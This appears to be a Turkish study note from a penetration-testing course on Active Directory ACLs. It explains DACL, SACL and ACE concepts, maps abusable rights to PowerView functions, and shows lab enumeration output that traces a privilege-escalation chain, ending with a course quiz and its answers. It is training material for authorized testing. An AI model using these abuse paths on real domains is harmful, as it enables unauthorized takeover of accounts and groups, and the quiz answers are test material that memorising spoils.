En basit haliyle ACL'ler, a) kimin hangi varlığa/kaynağa erişimi olduğunu ve b) sağladıkları erişim düzeyini tanımlayan listelerdir. Bir ACL'deki ayarların kendilerine `Access Control Entries` (`ACEs`) denir. Her ACE bir kullanıcı, grup veya prosese (güvenlik sorumluları olarak da bilinir) eşlenir ve bu sorumluya verilen hakları tanımlar. Her nesnenin bir ACL'si vardır, ancak birden fazla güvenlik sorumlusu AD'deki nesnelere erişebildiğinden birden fazla ACE'ye sahip olabilir. ACL'ler AD içindeki erişimi denetlemek için de kullanılabilir.

İki tür ACL vardır:

- **DACL (Seçimli Erişim Denetim Listesi)**: Bir nesneye kimin erişim hakkı olduğunu veya olmadığını belirleyen kurallar listesidir. Bu liste, bir nesne için hangi kullanıcıların veya grupların hangi izinlere sahip olduğunu gösterir.
    
- **ACE (Access Control Entry)**: DACL içindeki her bir kural veya giriştir. ACE, bir kullanıcı veya grup için belirli bir erişim izni (izin verme veya reddetme) tanımlar. Örneğin, bir ACE, "Ali bu dosyayı okuyabilir ama yazamaz" gibi bir izin kuralını temsil eder.
    

### DACL’nin Çalışma Mantığı:

1. **DACL'nin varlığı**: Eğer bir nesne için bir DACL varsa, bu nesneye kimlerin erişebileceğini belirler. Bu liste yoksa, sistem herkese tam erişim izni verir. Yani, DACL oluşturulmamış bir nesne varsayılan olarak herkes tarafından erişilebilir olur.
    
2. **Erişim kontrolü**: Birisi bir nesneye erişmeye çalıştığında, sistem önce DACL’ye bakar. DACL, o kullanıcı veya grup için hangi erişim düzeylerinin izin verildiğini veya reddedildiğini belirler.
    
3. **ACE'lerin olmaması durumu**: DACL'de bir kullanıcı veya grup hakkında ACE yoksa, yani belirli bir kural tanımlanmamışsa, sistem o kişiye erişim izni vermez ve erişimi reddeder.
    

### Örnek:

Bir dosya üzerinde bir DACL oluşturulduğunu düşünelim. Bu DACL, dosyaya erişebilecek kişiler hakkında ACE’ler içerir:

- **Ali** için bir ACE: "Ali dosyayı okuyabilir."
- **Ayşe** için bir ACE: "Ayşe dosyayı yazabilir."
- **Mehmet** için bir ACE: "Mehmet dosyaya erişemez."

Bu durumda:

- Ali dosyayı sadece okuyabilir.
- Ayşe dosyayı yazabilir, yani içeriği değiştirebilir.
- Mehmet dosyaya hiç erişemez.

Eğer dosya için bir DACL yoksa, herkes dosyaya tam erişim hakkına sahip olur. Eğer DACL varsa ama kimse için ACE yoksa, herkesin erişimi otomatik olarak reddedilir.


2. `System Access Control Lists` (`SACL`) - yöneticilerin güvenli nesnelere yapılan erişim denemelerini günlüğe kaydetmesine olanak tanır.

### SACL’nin İşlevi:

1. **Erişim denetimi**: SACL, yöneticilerin belirli kullanıcıların ya da işlemlerin güvenli nesnelere erişim denemelerini izlemelerine olanak tanır. Bu, başarılı ya da başarısız erişim denemelerini kaydetmek amacıyla yapılır. Örneğin, bir dosyaya kimlerin erişmeye çalıştığı veya erişimin başarılı olup olmadığı SACL aracılığıyla izlenir.
    
2. **Log'ların oluşturulması**: SACL'de belirtilen kurallar doğrultusunda, nesneye kimlerin eriştiği ya da erişmeye çalıştığı sistem tarafından kaydedilir. Bu kayıtlar daha sonra güvenlik yöneticileri tarafından gözden geçirilebilir. SACL sayesinde sistem yöneticileri, belirli bir dosya ya da kaynağa yönelik herhangi bir yetkisiz erişim denemesini tespit edebilir.
    

### Örnek:

Bir dosya üzerinde bir SACL oluşturulduğunu düşünelim. Bu SACL, dosyaya erişmeye çalışan kullanıcılar için denetim (audit) kuralları içerir:

- **Ali** dosyaya her erişmeye çalıştığında bu deneme günlüğe kaydedilsin.
- **Ayşe** dosyayı okursa veya değiştirirse bu kaydedilsin.
- **Mehmet** dosyaya erişmeye çalışırsa ve başarısız olursa bu kaydedilsin.

Aşağıdaki resimde kullanıcı hesabı `için` ACL'yi görüyoruz. `Permission entry` 'ler altındaki her bir öğe kullanıcı hesabı için `DACL` 'yi oluştururken, tek tek girdiler ( `Full Control` veya `Change Password` gibi) bu kullanıcı nesnesi üzerinde çeşitli kullanıcılara ve gruplara verilen hakları gösteren ACE girdileridir.


#### **Forend'in ACL'sini görüntüleme**
![Pasted image 20241021214714.png](/img/user/resimler/Pasted%20image%2020241021214714.png)



## **Access Control Entries (ACEs)**
Daha önce belirtildiği gibi, Access Control Lists (ACL'ler) bir kullanıcıyı veya grubu ve belirli bir güvenli nesne üzerinde sahip oldukları erişim düzeyini adlandıran ACE girişlerini içerir. AD'deki tüm güvenli nesnelere uygulanabilen `üç` ana ACE türü vardır:

`Access denied ACE :`Bir kullanıcı veya grubun bir nesneye erişiminin açıkça reddedildiğini göstermek için bir DACL içinde kullanılır  

`Access allowed ACE :`Bir kullanıcı veya gruba bir nesneye açıkça erişim`izni`verildiğini göstermek için bir DACL içinde kullanılır  

`System audit ACE :`Bir kullanıcı veya grup bir nesneye erişmeye çalıştığında denetim günlükleri oluşturmak için bir SACL içinde kullanılır. Erişim izni verilip verilmediğini ve ne tür bir erişimin gerçekleştiğini kaydeder

Her bir ACE aşağıdaki `dört` bileşenden oluşur:

1. Nesneye erişimi olan kullanıcı/grup güvenlik tanımlayıcısı (SID) (veya grafiksel olarak asıl ad)  
    
2. ACE türünü belirten bir bayrak (erişim reddedildi, izin verildi veya sistem denetim ACE'si)  
    
3. Alt kapsayıcıların/nesnelerin verilen ACE girişini birincil veya üst nesneden miras alıp alamayacağını belirten bir dizi bayrak  
    
4. Bir nesneye verilen hakları tanımlayan 32 bitlik bir değer olan [erişim maskesi](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dtyp/7a53f60e-e730-4dfe-bbe9-b21b62eb790b?redirectedfrom=MSDN)

Bunu `Active Directory Users and Computers` (`ADUC`) içinde grafiksel olarak görüntüleyebiliriz. Aşağıdaki örnek resimde `forend` kullanıcısına ait ACE girişi için aşağıdakileri görebiliriz:


#### **Active Directory Kullanıcıları ve Bilgisayarları aracılığıyla İzinleri Görüntüleme**
![Pasted image 20241021215107.png](/img/user/resimler/Pasted%20image%2020241021215107.png)
1. Güvenlik müdürü Angela Dunn'dır (adunn@inlanefreight.local)  
    
2. ACE türü `Allow`'dur (İzin ver)  
    
3. Miras "Bu nesne ve tüm alt nesneler" için geçerlidir, yani `forend` nesnesinin tüm alt nesneleri verilen aynı izinlere sahip olacaktır  
    
4. Nesneye verilen haklar, bu örnekte yine grafik olarak gösterilmiştir

Erişim kontrol listeleri izinleri belirlemek için kontrol edildiğinde, listede reddedilen bir erişim bulunana kadar yukarıdan aşağıya doğru kontrol edilirler.


## Why are ACEs Important?
Saldırganlar ACE kayıtlarını daha fazla erişim ya da kalıcılık sağlamak için kullanırlar. Birçok kuruluş her bir nesneye uygulanan ACE'lerin ya da bunların yanlış uygulandığında yaratabileceği etkinin farkında olmadığından, bunlar sızma testçileri olarak bizim için harika olabilir. Güvenlik açığı tarama araçları tarafından tespit edilemezler ve özellikle büyük ve karmaşık ortamlarda genellikle yıllarca kontrol edilmezler. Müşterinin tüm "düşük asılı meyve" AD kusurlarını / yanlış yapılandırmalarını hallettiği bir değerlendirme sırasında, ACL kötüye kullanımı, yanal / dikey olarak hareket etmemiz ve hatta tam alan güvenliğini tehlikeye atmamız için harika bir yol olabilir. Bazı örnek Active Directory nesne güvenlik izinleri aşağıdaki gibidir. Bunlar BloodHound gibi bir araç kullanılarak numaralandırılabilir (ve görselleştirilebilir) ve diğer araçların yanı sıra PowerView ile kötüye kullanılabilir:

- `ForceChangePassword` abused with `Set-DomainUserPassword`
- `Add Members` abused with `Add-DomainGroupMember`
- `GenericAll` abused with `Set-DomainUserPassword` or `Add-DomainGroupMember`
- `GenericWrite` abused with `Set-DomainObject`
- `WriteOwner` abused with `Set-DomainObjectOwner`
- `WriteDACL` abused with `Add-DomainObjectACL`
- `AllExtendedRights` abused with `Set-DomainUserPassword` or `Add-DomainGroupMember`
- `Addself` abused with `Add-DomainGroupMember`

Bu modülde, ACL saldırılarının gücünü vurgulamak için dört özel ACE'nin numaralandırılmasını ve kullanılmasını ele alacağız:


- [ForceChangePassword](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#forcechangepassword) - bize bir kullanıcının şifresini, şifresini bilmeden sıfırlama hakkı verir (dikkatli kullanılmalıdır ve genellikle şifreleri sıfırlamadan önce müşterimize danışmak en iyisidir).

- [GenericWrite](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#genericwrite) - bize bir nesne üzerindeki korumalı olmayan herhangi bir özniteliğe yazma hakkı verir. Bir kullanıcı üzerinde bu erişime sahipsek, onlara bir SPN atayabilir ve bir Kerberoasting saldırısı gerçekleştirebiliriz (hedef hesabın zayıf bir parola kümesine sahip olmasına dayanır). Bir grup üzerinde, kendimizi veya başka bir güvenlik sorumlusunu belirli bir gruba ekleyebileceğimiz anlamına gelir. Son olarak, bir bilgisayar nesnesi üzerinde bu erişime sahip olursak, bu modülün kapsamı dışında olan kaynak tabanlı kısıtlı bir delegasyon saldırısı gerçekleştirebiliriz.

- `AddSelf` - bir kullanıcının kendisini ekleyebileceği güvenlik gruplarını gösterir.

- [GenericAll](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#genericall) - bu bize bir hedef nesne üzerinde tam kontrol sağlar. Yine, bunun bir kullanıcı veya grup üzerinde verilmesine bağlı olarak, grup üyeliğini değiştirebilir, bir parolayı değiştirmeye zorlayabilir veya hedefli bir Kerberoasting saldırısı gerçekleştirebiliriz. Bir bilgisayar nesnesi üzerinde bu erişime sahipsek ve ortamda [Yerel Yönetici Parolası Çözümü (LAPS)](“https://www.microsoft.com/en-us/download/details.aspx?id=46899”) kullanılıyorsa, LAPS parolasını okuyabilir ve makineye local admin erişimi sağlayabiliriz, bu da ayrıcalıklı kontroller elde edebilir veya bir tür ayrıcalıklı erişim sağlayabilirsek domain içinde yanal hareket veya ayrıcalık yükseltme konusunda bize yardımcı olabilir.

[Charlie Bromberg (Shutdown)](“https://twitter.com/_nwodtuhs”) tarafından oluşturulan bir grafikten uyarlanan bu grafik, çeşitli olası ACE saldırılarının ve bu saldırıları hem Windows hem de Linux'tan (varsa) gerçekleştirmek için kullanılan araçların mükemmel bir dökümünü göstermektedir. Aşağıdaki birkaç bölümde, bu saldırıların Linux'tan nasıl gerçekleştirilebileceğinden bahsederek, esas olarak bir Windows atak hostundan bu saldırıları numaralandırmayı ve gerçekleştirmeyi ele alacağız. Özellikle ACL Saldırıları ile ilgili daha sonraki bir modül, bu grafikte listelenen saldırıların her biri ve bunların Windows ve Linux'tan nasıl gerçekleştirileceği hakkında çok daha derinlemesine bilgi verecektir.

![Pasted image 20241021231320.png](/img/user/resimler/Pasted%20image%2020241021231320.png)

Active Directory'de zaman zaman başka birçok ilginç ACE (ayrıcalık) ile karşılaşacağız. BloodHound ve PowerView gibi araçları ve hatta built-in AD yönetim araçlarını kullanarak olası ACL saldırılarını listeleme metodolojisi, henüz aşina olmadığımız yeni ayrıcalıklarla karşılaştığımızda bize yardımcı olacak kadar uyarlanabilir olmalıdır. Örneğin, BloodHound'a veri aktarabilir ve üzerinde kontrol sahibi olduğumuz (veya potansiyel olarak devralabileceğimiz) bir kullanıcının [ReadGMSAPassword](“https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#readgmsapassword”) kenarı aracılığıyla bir Group Managed Service Account (gMSA) parolasını okuma haklarına sahip olduğunu görebiliriz. Bu durumda, söz konusu servis hesabının parolasını elde etmek için diğer yöntemlerle birlikte kullanabileceğimiz [GMSAPasswordReader](“https://github.com/rvazarkar/GMSAPasswordReader”) gibi araçlar vardır. Diğer zamanlarda PowerView kullanarak [Unexpire-Password](https://learn.microsoft.com/en-us/windows/win32/adschema/r-unexpire-password) veya [Reanimate-Tombstones](https://learn.microsoft.com/en-us/windows/win32/adschema/r-reanimate-tombstones) gibi genişletilmiş haklarla karşılaşabiliriz ve bunları kendi yararımıza nasıl kullanacağımızı bulmak için biraz araştırma yapmamız gerekebilir. Bir değerlendirme sırasında daha az yaygın olan biriyle ne zaman karşılaşacağınızı asla bilemeyeceğinizden, tüm [BloodHound kenarlarını](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html) ve mümkün olduğunca çok sayıda Active Directory Genişletilmiş [Haklarını](https://learn.microsoft.com/en-us/windows/win32/adschema/extended-rights) öğrenmeye değer.



## **Vahşi Doğada ACL Saldırıları**

ACL ataklarını şunlar için kullanabiliriz:  
- Yanal hareket 
- Ayrıcalık yükseltme  
- Kalıcılık

Bazı yaygın saldırı senaryoları şunları içerebilir:


`Parolayı unuttum izinlerinin kötüye kullanılması :` Help Desk ve diğer BT kullanıcılarına genellikle parola sıfırlama ve diğer ayrıcalıklı görevleri gerçekleştirme izinleri verilir. Bu ayrıcalıklara sahip bir hesabı (veya kullanıcılarına bu ayrıcalıkları veren bir gruptaki bir hesabı) ele geçirebilirsek, domain'deki daha ayrıcalıklı bir hesap için parola sıfırlama işlemi gerçekleştirebiliriz.

`Grup üyeliği yönetiminin kötüye kullanılması:` Help Desk ve diğer personelin belirli bir gruba kullanıcı ekleme/çıkarma hakkına sahip olduğunu görmek de yaygındır. Bazen kontrol ettiğimiz bir hesabı ayrıcalıklı bir yerleşik AD grubuna veya bize bir tür ilginç ayrıcalık tanıyan bir gruba ekleyebileceğimiz için bunu her zaman daha ayrıntılı olarak listelemeye değer.

`Aşırı kullanıcı hakları :` Müşterinin muhtemelen farkında olmadığı aşırı haklara sahip kullanıcı, bilgisayar ve grup nesnelerini de yaygın olarak görüyoruz. Bu, bir tür yazılım yüklemesinden (örneğin Exchange, yükleme sırasında ortama birçok ACL değişikliği ekler) veya bir kullanıcıya istenmeyen haklar veren bir tür eski veya kazara yapılandırmadan sonra ortaya çıkabilir. Bazen kolaylık olsun diye ya da can sıkıcı bir sorunu daha hızlı çözmek için belirli haklar verilmiş bir hesabı devralabiliriz.

Active Directory ACL'leri dünyasında başka birçok olası saldırı senaryosu vardır, ancak bu üçü en yaygın olanlarıdır. Bu hakları çeşitli şekillerde numaralandırmayı, saldırıları gerçekleştirmeyi ve kendimizden sonra temizlemeyi ele alacağız.

****Not:**** Bazı ACL saldırıları, bir kullanıcının parolasını değiştirmek veya müşterinin AD domaininde başka değişiklikler yapmak gibi "yıkıcı" olarak kabul edilebilir. Şüpheye düşerseniz, bir sorun çıkması durumunda onaylarını yazılı olarak belgelemek için belirli bir saldırıyı gerçekleştirmeden önce müşterimiz tarafından çalıştırmak her zaman en iyisidir. Saldırılarımızı başından sonuna kadar her zaman dikkatlice belgelemeli ve değişiklikleri geri almalıyız. Bu veriler raporumuza dahil edilmelidir, ancak yaptığımız değişiklikleri de açıkça vurgulamalıyız, böylece müşteri geri dönüp değişikliklerimizin gerçekten düzgün bir şekilde geri alındığını doğrulayabilir.


Soru : Hangi ACL türü, hangi güvenlik sorumlularına bir nesneye erişim izni verildiğini veya reddedildiğini tanımlar? (tek kelime)
Cevap :DACL

Soru : Hedefli bir Kerberoasting saldırısı gerçekleştirmek için hangi ACE girişinden yararlanılabilir?
Cevap : GenericAll



# ACL Enumeration
PowerView kullanarak ACL'leri numaralandırmaya ve BloodHound kullanarak bazı grafiksel gösterimler üzerinden yürümeye başlayalım. Daha sonra, numaralandırdığımız ACE'lerin iç ortamda bize daha fazla erişim sağlamak için kullanılabileceği birkaç senaryoyu / saldırıyı ele alacağız.


## **PowerView ile ACL'leri Numaralandırma**
ACL'leri numaralandırmak için PowerView'i kullanabiliriz, ancak _tüm_ sonuçları inceleme görevi son derece zaman alıcı ve muhtemelen hatalı olacaktır. Örneğin, `Find-InterestingDomainAcl` fonksiyonunu çalıştırırsak, herhangi bir anlam çıkarmak için incelememiz gereken çok büyük miktarda bilgi alacağız:

#### **Find-InterestingDomainAcl Kullanma**

```powershell-session
PS C:\htb> Find-InterestingDomainAcl

ObjectDN                : DC=INLANEFREIGHT,DC=LOCAL
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : ExtendedRight
ObjectAceType           : ab721a53-1e2f-11d0-9819-00aa0040529b
AceFlags                : ContainerInherit
AceType                 : AccessAllowedObject
InheritanceFlags        : ContainerInherit
SecurityIdentifier      : S-1-5-21-3842939050-3880317879-2865463114-5189
IdentityReferenceName   : Exchange Windows Permissions
IdentityReferenceDomain : INLANEFREIGHT.LOCAL
IdentityReferenceDN     : CN=Exchange Windows Permissions,OU=Microsoft Exchange Security 
                          Groups,DC=INLANEFREIGHT,DC=LOCAL
IdentityReferenceClass  : group

ObjectDN                : DC=INLANEFREIGHT,DC=LOCAL
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : ExtendedRight
ObjectAceType           : 00299570-246d-11d0-a768-00aa006e0529
AceFlags                : ContainerInherit
AceType                 : AccessAllowedObject
InheritanceFlags        : ContainerInherit
SecurityIdentifier      : S-1-5-21-3842939050-3880317879-2865463114-5189
IdentityReferenceName   : Exchange Windows Permissions
IdentityReferenceDomain : INLANEFREIGHT.LOCAL
IdentityReferenceDN     : CN=Exchange Windows Permissions,OU=Microsoft Exchange Security 
                          Groups,DC=INLANEFREIGHT,DC=LOCAL
IdentityReferenceClass  : group

<SNIP>
```


Zaman sınırlı bir değerlendirme sırasında tüm bu verileri incelemeye çalışırsak, değerlendirme bitmeden önce muhtemelen hiçbir zaman hepsini inceleyemeyiz veya ilginç bir şey bulamayız. Şimdi, PowerView gibi bir aracı daha etkili bir şekilde kullanmanın bir yolu var - üzerinde kontrol sahibi olduğumuz bir kullanıcıdan başlayarak hedefli numaralandırma yaparak. `LLMNR/NBT-NS Poisoning - from Linux` bölümündeki son soruyu çözdükten sonra elde ettiğimiz `wley` kullanıcısına odaklanalım. Şimdi bu kullanıcının yararlanabileceğimiz ilginç ACL hakları olup olmadığına bakalım. Etkin bir şekilde arama yapabilmek için öncelikle hedef kullanıcımızın SID'sini almamız gerekiyor.

```powershell-session
PS C:\htb> Import-Module .\PowerView.ps1
PS C:\htb> $sid = Convert-NameToSid wley
```

Daha sonra hedeflediğimiz aramayı gerçekleştirmek için `Get-DomainObjectACL` fonksiyonunu kullanabiliriz. Aşağıdaki örnekte, `$sid` değişkenini kullanarak kullanıcının SID' `sini` `SecurityIdentifier` özelliğiyle eşleştirerek kullanıcımızın üzerinde haklara sahip olduğu tüm domain nesnelerini bulmak için bu işlevi kullanıyoruz, bu da bize bir nesne üzerinde verilen hakka _kimin_ sahip olduğunu söyler. Dikkat edilmesi gereken önemli bir husus, `ResolveGUIDs` bayrağı olmadan arama yaparsak, `ExtendedRight` hakkının bize kullanıcının `damundsen` üzerinde hangi ACE girişine sahip olduğuna `dair` net bir resim vermediği aşağıdaki gibi sonuçlar göreceğimizdir. Bunun nedeni `ObjectAceType` özelliğinin insan tarafından okunamayan bir GUID değeri döndürmesidir.

Özellikle büyük bir ortamda bu komutun çalışmasının biraz zaman alacağını unutmayın. Laboratuvarımızda bir sonuç almak 1-2 dakika sürebilir.


#### **Get-DomainObjectACL Kullanma**
```powershell-session
PS C:\htb> Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}

ObjectDN               : CN=Dana Amundsen,OU=DevOps,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
ObjectSID              : S-1-5-21-3842939050-3880317879-2865463114-1176
ActiveDirectoryRights  : ExtendedRight
ObjectAceFlags         : ObjectAceTypePresent
ObjectAceType          : 00299570-246d-11d0-a768-00aa006e0529
InheritedObjectAceType : 00000000-0000-0000-0000-000000000000
BinaryLength           : 56
AceQualifier           : AccessAllowed
IsCallback             : False
OpaqueLength           : 0
AccessMask             : 256
SecurityIdentifier     : S-1-5-21-3842939050-3880317879-2865463114-1181
AceType                : AccessAllowedObject
AceFlags               : ContainerInherit
IsInherited            : False
InheritanceFlags       : ContainerInherit
PropagationFlags       : None
AuditFlags             : None
```

Google'da `00299570-246d-11d0-a768-00aa006e0529` GUID değerini arayabilir ve kullanıcının diğer kullanıcının parolasını değiştirmeye zorlama hakkına sahip olduğunu gösteren [bu](https://docs.microsoft.com/en-us/windows/win32/adschema/r-user-force-change-password) sayfayı ortaya çıkarabiliriz. Alternatif olarak, doğru adı GUID değerine geri eşlemek için PowerShell kullanarak ters arama yapabiliriz.


#### **Ters Arama Yapma ve GUID Değeriyle Eşleme**
```powershell-session
PS C:\htb> $guid= "00299570-246d-11d0-a768-00aa006e0529"

PS C:\htb> Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * |Select Name,DisplayName,DistinguishedName,rightsGuid| ?{$_.rightsGuid -eq $guid} | fl

Name              : User-Force-Change-Password
DisplayName       : Reset Password
DistinguishedName : CN=User-Force-Change-Password,CN=Extended-Rights,CN=Configuration,DC=INLANEFREIGHT,DC=LOCAL
rightsGuid        : 00299570-246d-11d0-a768-00aa006e0529
```

Bu bize cevabımızı verdi, ancak bir değerlendirme sırasında oldukça verimsiz olurdu. PowerView, bizim için tam da bu işi yapan `ResolveGUIDs` bayrağına sahiptir. `ObjectAceType` özelliğinin insan tarafından okunabilir biçimini `User-Force-Change-Password` olarak göstermek için bu bayrağı eklediğimizde çıktının nasıl değiştiğine dikkat edin.


#### Using the -ResolveGUIDs Flag
```powershell-session
PS C:\htb> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid} 

AceQualifier           : AccessAllowed
ObjectDN               : CN=Dana Amundsen,OU=DevOps,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights  : ExtendedRight
ObjectAceType          : User-Force-Change-Password
ObjectSID              : S-1-5-21-3842939050-3880317879-2865463114-1176
InheritanceFlags       : ContainerInherit
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-3842939050-3880317879-2865463114-1181
AccessMask             : 256
AuditFlags             : None
IsInherited            : False
AceFlags               : ContainerInherit
InheritedObjectAceType : All
OpaqueLength           : 0
```

Önce ResolveGUIDs kullanarak arama yapabilecekken neden bu örnek üzerinden yürüdük?

Araçlarımızın ne yaptığını anlamamız ve bir aracın başarısız olması veya engellenmesi durumunda araç setimizde alternatif yöntemlere sahip olmamız çok önemlidir. Devam etmeden önce, bir client sisteminde kullanabileceğimiz [Get-Acl](“https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.security/get-acl?view=powershell-7.2”) ve [Get-ADUser](“https://docs.microsoft.com/en-us/powershell/module/activedirectory/get-aduser?view=windowsserver2022-ps”) cmdlet'lerini kullanarak bunu nasıl yapabileceğimize hızlıca bir göz atalım. PowerView gibi bir araç kullanmadan bu tür bir aramanın nasıl gerçekleştirileceğini bilmek büyük fayda sağlar ve bizi benzerlerimizden ayırabilir. Bu bilgiyi, bir müşterinin sistemlerinden birinde çalışmamızı istediğinde ve kendi sistemlerimizden herhangi birini çekme yeteneği olmadan sistemde hazır bulunan araçlarla sınırlandırıldığımızda sonuç elde etmek için kullanabiliriz.

Bu örnek çok verimli değildir ve komutun çalışması, özellikle büyük bir ortamda uzun sürebilir. PowerView kullanan eşdeğer komuttan çok daha uzun sürecektir. Bu komutta, ilk olarak aşağıdaki komutla tüm domain kullanıcılarının bir listesini yaptık:

#### **Domain Kullanıcılarının Listesini Oluşturma**

```powershell-session
PS C:\htb> Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt
```

Daha sonra bir `foreach` döngüsü kullanarak dosyanın her satırını okuruz ve `ad_users.txt` dosyasının her satırını `Get-ADUser` cmdlet'ine besleyerek her bir domain kullanıcısı için ACL bilgilerini almak üzere `Get-Acl` cmdlet'ini kullanırız. Daha sonra bize erişim hakları hakkında bilgi verecek olan sadece `Access özelliğini` seçiyoruz. Son olarak, `IdentityReference` özelliğini kontrol ettiğimiz (veya hangi haklara sahip olduğunu görmek istediğimiz) kullanıcıya, bizim durumumuzda `wley`'e ayarlıyoruz.


#### **Kullanışlı Bir foreach Döngüsü**

```powershell-session
PS C:\htb> foreach($line in [System.IO.File]::ReadLines("C:\Users\htb-student\Desktop\ad_users.txt")) {get-acl  "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\wley'}}

Path                  : Microsoft.ActiveDirectory.Management.dll\ActiveDirectory:://RootDSE/CN=Dana 
                        Amundsen,OU=DevOps,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights : ExtendedRight
InheritanceType       : All
ObjectType            : 00299570-246d-11d0-a768-00aa006e0529
InheritedObjectType   : 00000000-0000-0000-0000-000000000000
ObjectFlags           : ObjectAceTypePresent
AccessControlType     : Allow
IdentityReference     : INLANEFREIGHT\wley
IsInherited           : False
InheritanceFlags      : ContainerInherit
PropagationFlags      : None
```

Bu verileri elde ettikten sonra, hedef kullanıcı üzerinde hangi haklara sahip olduğumuzu anlamak amacıyla GUID'yi insan tarafından okunabilir bir biçime dönüştürmek için yukarıda gösterilen aynı yöntemleri izleyebiliriz.  

Özetlemek gerekirse, `wley` kullanıcısı ile başladık ve şimdi `User-Force-Change-Password` genişletilmiş hakkı aracılığıyla `damundsen` kullanıcısı üzerinde kontrol sahibiyiz. Powerview'ı kullanarak `damundsen` hesabı üzerindeki kontrolün bizi nereye götürebileceğini araştıralım.


#### **Damundsen Kullanılarak Hakların Daha Fazla Numaralandırılması**

```powershell-session
PS C:\htb> $sid2 = Convert-NameToSid damundsen
PS C:\htb> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid2} -Verbose

AceType               : AccessAllowed
ObjectDN              : CN=Help Desk Level 1,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights : ListChildren, ReadProperty, GenericWrite
OpaqueLength          : 0
ObjectSID             : S-1-5-21-3842939050-3880317879-2865463114-4022
InheritanceFlags      : ContainerInherit
BinaryLength          : 36
IsInherited           : False
IsCallback            : False
PropagationFlags      : None
SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-1176
AccessMask            : 131132
AuditFlags            : None
AceFlags              : ContainerInherit
AceQualifier          : AccessAllowed
```

Şimdi `damundsen` kullanıcımızın `Help Desk Level 1` grubu üzerinde `GenericWrite` ayrıcalıklarına sahip olduğunu görebiliriz. Bu, diğer şeylerin yanı sıra, herhangi bir kullanıcıyı (veya kendimizi) bu gruba ekleyebileceğimiz ve bu grubun kendisine uyguladığı tüm hakları devralabileceğimiz anlamına gelir. Bu gruba verilen haklar için yapılan bir arama ilginç bir sonuç vermiyor.

İç içe grup üyeliğinin, A grubundaki herhangi bir kullanıcının, A grubunun iç içe olduğu (üyesi olduğu) herhangi bir grubun tüm haklarını devralacağı anlamına geleceğini hatırlayarak, bu grubun başka gruplarla iç içe olup olmadığına bakalım. Hızlı bir arama bize `Help Desk Level 1` grubunun `Information Technology` grubuyla iç içe olduğunu gösteriyor, yani kendimizi `damundsen` kullanıcımızın `GenericWrite` ayrıcalıklarına sahip olduğu `Help Desk Level 1` grubuna eklersek `Information Technology` grubunun üyelerine verdiği tüm hakları elde edebiliriz.

#### **Get-DomainGroup ile Help Desk Düzey 1 Grubunun İncelenmesi**

```powershell-session
PS C:\htb> Get-DomainGroup -Identity "Help Desk Level 1" | select memberof

memberof                                                                      
--------                                                                      
CN=Information Technology,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
```

Sindirilmesi gereken çok şey var! Nerede olduğumuzu özetleyelim:

- Responder kullanarak modülde (değerlendirme) daha önce hash'ini aldığımız ve açık metin şifre değerini ortaya çıkarmak için Hashcat kullanarak çevrimdışı kırdığımız kullanıcı `wley` 'i üzerinde kontrol sahibiyiz  
    
- `wley` kullanıcısının üzerinde kontrol sahibi olduğu nesneleri numaralandırdık ve `damundsen` kullanıcısının parolasını değiştirmeye zorlayabileceğimizi gördük  
    
- Buradan, `damundsen` kullanıcısının `GenericWrite` ayrıcalıklarını kullanarak `Help Desk Level 1` grubuna bir üye ekleyebileceğini gördük  
    
- `Help Desk Level 1` grubu, `Information Technology` grubunun içine yerleştirilmiştir ve bu grubun üyelerine `Information` Technology grubuna sağlanan tüm hakları verir


Şimdi etrafımıza bakalım ve `Information Technology` üyelerinin ilginç bir şey yapıp yapamayacağını görelim. Bir kez daha, `Get-DomainObjectACL` kullanarak arama yaptığımızda, `Information Technology` grubunun üyelerinin `adunn` kullanıcısı üzerinde `GenericAll` haklarına sahip olduğunu görüyoruz, bu da yapabileceğimiz anlamına geliyor:

- Grup üyeliğini değiştirme  
- Parola değiştirmeye zorlama  
- Hedefli bir Kerberoasting saldırısı gerçekleştirin ve zayıfsa kullanıcının parolasını kırmaya çalışın


#### **Information Technology Group'un İncelenmesi**

```powershell-session
PS C:\htb> $itgroupsid = Convert-NameToSid "Information Technology"

PS C:\htb> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $itgroupsid} -Verbose

AceType               : AccessAllowed
ObjectDN              : CN=Angela Dunn,OU=Server Admin,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights : GenericAll
OpaqueLength          : 0
ObjectSID             : S-1-5-21-3842939050-3880317879-2865463114-1164
InheritanceFlags      : ContainerInherit
BinaryLength          : 36
IsInherited           : False
IsCallback            : False
PropagationFlags      : None
SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-4016
AccessMask            : 983551
AuditFlags            : None
AceFlags              : ContainerInherit
AceQualifier          : AccessAllowed
```

